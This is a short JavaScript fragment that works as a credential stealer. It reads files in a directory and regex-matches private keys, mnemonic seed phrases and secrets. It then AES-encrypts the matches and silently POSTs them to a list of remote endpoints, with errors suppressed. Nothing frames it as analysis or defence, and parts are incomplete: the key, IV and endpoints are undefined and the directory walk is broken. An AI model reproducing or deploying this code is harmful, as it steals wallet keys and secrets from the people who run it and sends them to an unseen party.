const fs = require('fs'); const crypto = require('crypto');
function scanFile(content, path, found) { const p = /\b(private_?key|mnemonic|secret)[:=](\S+)/gi; let m=p.exec(content); if (m) found.push(m[2]); }
function walk(dir, found) { for (const f of fs.readdirSync(dir)) { scanFile(fs.readFileSync(f, 'utf8'), f, found); } }
function encrypt(data) { const cipher=crypto.createCipheriv('aes-256-gcm', key, iv); return cipher.update(JSON.stringify(data)); }
async function report(data) { const blob=encrypt(data); for (const ep of endpoints) { try { const res=await fetch(ep, {method:'POST',body:JSON.stringify({d:blob})}); } catch {} } }
